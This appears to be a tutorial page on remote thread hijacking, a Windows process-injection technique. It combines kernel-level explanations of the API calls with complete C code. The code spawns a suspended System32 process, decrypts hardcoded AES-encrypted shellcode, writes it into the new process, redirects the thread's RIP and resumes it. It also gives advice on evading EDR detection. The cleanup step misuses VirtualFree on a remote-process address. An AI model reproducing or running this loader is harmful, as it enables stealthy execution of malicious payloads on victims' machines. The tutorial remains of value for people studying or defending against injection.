---
icon: remote
---

# Thread Hijacking Remote Thread Creation

#### Introduction

Local thread hijacking hijacks a thread inside your own process. Remote thread hijacking does the same thing but against a completely separate process. Instead of targeting an already running process, this technique spawns a fresh suspended process yourself, injects shellcode into its memory, redirects its initial thread's RIP to the shellcode, and resumes it. You are the one who created the victim. You control it from birth.

***

#### CreateProcessA

```c
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```

**What It Does**

Spawns a new process. When `CREATE_SUSPENDED` is passed in `dwCreationFlags`, the process is created fully but its initial thread never executes a single instruction. It sits frozen, waiting for `ResumeThread`. This is the setup that makes hijacking possible.

**What Happens Inside the Kernel**

`CreateProcessA` is in `kernel32.dll`. It internally calls `NtCreateUserProcess` in `ntdll.dll`, which crosses into kernel mode via a syscall. Everything from this point happens inside the kernel:

**The file is opened and mapped**

The kernel opens the `.exe` file on disk and creates a `FILE_OBJECT` in nonpaged pool representing that open file. It then creates a **section object** from that file. A section object is a kernel object that represents a mapping between a file on disk and memory. It is the recipe for how this PE should be loaded. No memory in any process address space is touched yet, the section object just describes the file.

```
disk -> FILE_OBJECT created in nonpaged pool
FILE_OBJECT -> NtCreateSection -> Section Object created
```

**A new EPROCESS is born**

`PspAllocateProcess` is called. A brand new `_EPROCESS` structure is allocated in nonpaged pool. This is the process container. It gets:

* Its own page directory, which means a completely private virtual address space, isolated from every other process
* An empty handle table (`_EPROCESS.ObjectTable`)
* An empty VAD tree for tracking memory regions
* A PEB set up in its own user-mode memory

PEB (Process Environment Block) is a structure that lives in the process's own user-mode memory. It holds the process's identity:

```
PEB
  +0x010 ImageBaseAddress   -> where the .exe loaded in memory
  +0x018 Ldr               -> linked list of all loaded DLLs
  +0x020 ProcessParameters -> command line, environment variables
  +0x002 BeingDebugged     -> what IsDebuggerPresent() reads
```

At this point a process exists but has zero threads. It cannot run anything.

**The PE is mapped into the new address space**

The kernel takes the section object from step 1 and maps it into the new process's virtual address space. This means:

1. The kernel picks a base address inside the new process's virtual space
2. Creates a VAD (Virtual Address Descriptor) entry in the new process's VAD tree saying "this address range = this PE section"
3. Sets up page table entries in the new process's page directory pointing those virtual addresses at the physical pages of the PE

The exe is not copied anywhere new. The section object already knows where the physical pages are. The mapping just makes those pages visible from inside the new process at those addresses.

`ntdll.dll` is also mapped in automatically at this point. Every process on Windows gets `ntdll.dll` mapped in without exception. It is the bridge between user mode and kernel mode.

```
new process address space after mapping:
  0x00007FF6A0000000  ->  target.exe image
  0x00007FFA10000000  ->  ntdll.dll (always, automatically)
```

**The initial thread is created**

`PspAllocateThread` allocates a new `_ETHREAD` inside the new `_EPROCESS`. This thread does not start at `main()`. It starts at `ntdll!LdrInitializeThunk`, which is the loader. The loader's job is to finish setting up the process before any application code runs:

```
LdrInitializeThunk
  -> reads PE import table to find required DLLs
  -> loads each DLL (kernel32.dll, user32.dll, etc.)
  -> calls each DLL's DllMain with DLL_PROCESS_ATTACH
  -> jumps to the exe's actual entry point -> main()
```

When `CREATE_SUSPENDED` is passed, this thread is frozen before `LdrInitializeThunk` executes even one instruction. `SuspendCount` in `_KTHREAD` is set to 1 so the scheduler ignores it completely.

**Step 5 - lpProcessInformation is filled**

```c
typedef struct _PROCESS_INFORMATION {
  HANDLE hProcess;    // handle to the new _EPROCESS (in YOUR handle table)
  HANDLE hThread;     // handle to the initial _ETHREAD (in YOUR handle table)
  DWORD  dwProcessId; // PID
  DWORD  dwThreadId;  // TID
} PROCESS_INFORMATION;
```

`hProcess` and `hThread` are entries in your injector process's own `_EPROCESS.ObjectTable`. They point to the new process and its initial thread sitting in nonpaged pool.

***

#### VirtualAllocEx

```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

**What It Does**

Same as `VirtualAlloc` but operates inside a different process's address space. Takes `hProcess` as the first parameter so the kernel knows which process's address space to allocate in.

**What Happens Inside the Kernel**

The kernel uses `hProcess` to resolve the target `_EPROCESS` via your handle table. It then calls `NtAllocateVirtualMemory` targeting that process's VAD tree instead of your own. A new VAD entry is created inside the target process's address space, and page table entries are set up in the target process's page directory. The allocated memory is physically in RAM but it is only accessible from inside the target process's address space, not yours.

```
your process        kernel                    target process
hProcess ---------> _EPROCESS resolved
                    new VAD entry created ---> 0x0000020A00000000 (allocated)
                    page tables set up         accessible from here only
returns address: 0x0000020A00000000
```

`PAGE_READWRITE` is used intentionally here. allocating as executable immediately is a loud EDR signal. write first, flip protection after.

***

#### WriteProcessMemory

```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

**What It Does**

Writes bytes from your process's memory into the target process's memory at the address returned by `VirtualAllocEx`.

**What Happens Inside the Kernel**

The kernel resolves `hProcess` to the target `_EPROCESS`. It then uses `MmCopyVirtualMemory` which temporarily attaches to the target process's address space and copies the bytes from your buffer into the target's allocated region. The kernel can do this because it has access to all page directories. User mode cannot read or write another process's memory directly because page directories are private. The kernel does not have that restriction.

`lpNumberOfBytesWritten` is checked after the call. if it does not equal `nSize`, the write was incomplete and the shellcode is corrupt.

***

#### VirtualProtectEx

```c
BOOL VirtualProtectEx(
  [in]  HANDLE hProcess,
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

**What It Does**

Changes the memory protection of a region inside a remote process. After writing the shellcode with `PAGE_READWRITE`, this call flips it to `PAGE_EXECUTE_READWRITE` so the thread can execute it.

The reason for the split (write then protect) is to reduce the time a writable and executable region exists simultaneously. A region that is both writable and executable at the same time is one of the most common things EDRs flag. Splitting the two operations keeps the window small.

`lpflOldProtect` receives the previous protection flags. this parameter is required, passing `NULL` causes the call to fail.

***

#### Code Walkthrough

**CreateSuspendedProcess**

```c
BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO         Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFO);
```

Both structures are zero initialized with `RtlSecureZeroMemory`. `Si.cb` must be set to `sizeof(STARTUPINFO)` before the call. The kernel reads this field to know which version of the structure it is receiving. If it is not set correctly, `CreateProcessA` will fail.

```c
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
```

`%WINDIR%` is retrieved instead of hardcoding `C:\Windows` because the Windows directory is not guaranteed to always be on C. The full path is built as `C:\Windows\System32\<processname>`. `lpProcessName` should be just the filename like `notepad.exe`, not a full path.

```c
    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &Si,
        &Pi)) {
```

`lpApplicationName` is `NULL` so the path comes from `lpCommandLine` which is `lpPath`. `CREATE_SUSPENDED` freezes the initial thread the moment it is created. The process exists in memory fully set up but nothing executes.

```c
    *dwProcessId = Pi.dwProcessId;
    *hProcess    = Pi.hProcess;
    *hThread     = Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}
```

The output parameters are populated from `Pi`. All three are checked before returning success. `hThread` here is the handle to the initial thread of the newly created process. This is what gets hijacked.

***

**InjectShellcodeToRemoteProcess**

```c
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, pKey, pIv);
    SIZE_T sNumberOfBytesWritten = NULL;
    DWORD  dwOldProtection       = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);
```

Memory is allocated inside the target process using `hProcess`. `MEM_COMMIT | MEM_RESERVE` both reserves the virtual address range and commits physical memory for it in one call. `PAGE_READWRITE` only, not executable yet. The address of the allocation inside the target process is stored in `*ppAddress` and returned to the caller so it can be used later as the new `RIP`.

```c
    AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));
```

Shellcode is decrypted in place before writing. The ciphertext is stored in the binary. It gets decrypted into plaintext here using the hardcoded key and IV. This is why the shellcode is not visible as plaintext in the binary on disk.

```c
    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)
        || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
```

Shellcode is written into the target process at the allocated address. Both the return value and `sNumberOfBytesWritten` are checked. A partial write means corrupt shellcode which will crash.

```c
    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
```

Protection is flipped to executable after the write is complete. The shellcode is now sitting in the target process's memory, executable, at the address stored in `*ppAddress`.

***

**HijackThread**

```c
BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

    CONTEXT ThreadCtx = {
        .ContextFlags = CONTEXT_CONTROL
    };

    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
```

The initial thread's current saved register state is read. The thread is still suspended so its registers are saved in `_KTRAP_FRAME` inside `_KTHREAD`. `CONTEXT_CONTROL` is all that is needed since only `RIP` is being changed.

```c
    ThreadCtx.Rip = pAddress;

    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
```

`RIP` is updated to point at the shellcode address inside the target process. `SetThreadContext` writes this back into the thread's `_KTRAP_FRAME`. The thread still has not run a single instruction.

```c
    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}
```

`ResumeThread` decrements `SuspendCount` in `_KTHREAD` to zero. The scheduler is now allowed to run this thread. When it gets CPU time, `KiRestoreContext` loads `_KTRAP_FRAME` back onto the physical CPU registers including the modified `RIP`. The thread starts executing at the shellcode.

`WaitForSingleObject(hThread, INFINITE)` blocks the injector process until the hijacked thread finishes. Without this, the injector's `main` would return, the process would exit, and it might clean up handles before the shellcode finishes running.

***

**Main Function**

```c
int main(int argc, char* argv[]) {

    HANDLE hProcess    = NULL;
    DWORD  dwProcessid = NULL;
    HANDLE hThread     = NULL;
    PVOID  ppAddress   = NULL;

    if (argc < 2) {
        printf("[!] Usage: %s <Process Name>\n", argv[0]);
        return -1;
    }
```

Process name is taken from command line argument. Pass just the filename like `notepad.exe`, not a full path. `CreateSuspendedProcess` builds the full `System32` path internally.

```c
    if (!CreateSuspendedProcess(argv[1], &dwProcessid, &hProcess, &hThread)) {
        printf("[!] Process Not Found\n");
        return -1;
    }
```

Target process is spawned suspended. `hProcess` and `hThread` now point at the new process and its frozen initial thread. `argv[1]` is passed directly as `char*` which matches `LPCSTR`. No wide string conversion needed here.

```c
    if (!InjectShellcodeToRemoteProcess(hProcess, CipherText, sizeof(CipherText), &ppAddress)) {
        return -1;
    }
```

Shellcode is decrypted, allocated inside the target, written in, and marked executable. `ppAddress` now holds the address of the shellcode inside the target process's address space.

```c
    if (!HijackThread(hThread, ppAddress)) {
        return -1;
    }
```

`RIP` of the initial thread is redirected to `ppAddress`. Thread is resumed. Shellcode runs inside the target process. `WaitForSingleObject` inside `HijackThread` keeps the injector alive until it finishes.

```c
    CloseHandle(hProcess);
    CloseHandle(hThread);

    BOOL result = VirtualFree(ppAddress, 0, MEM_RELEASE);
    if (!result) {
        printf("Failed to free virtual memory. Error: %lu\n", GetLastError());
        return 1;
    }
    ppAddress = NULL;
    return 0;
}
```

Handles are closed and the allocated memory inside the target is freed. `MEM_RELEASE` frees the entire region that was originally reserved. `ppAddress` is set to `NULL` after freeing to avoid a dangling pointer.
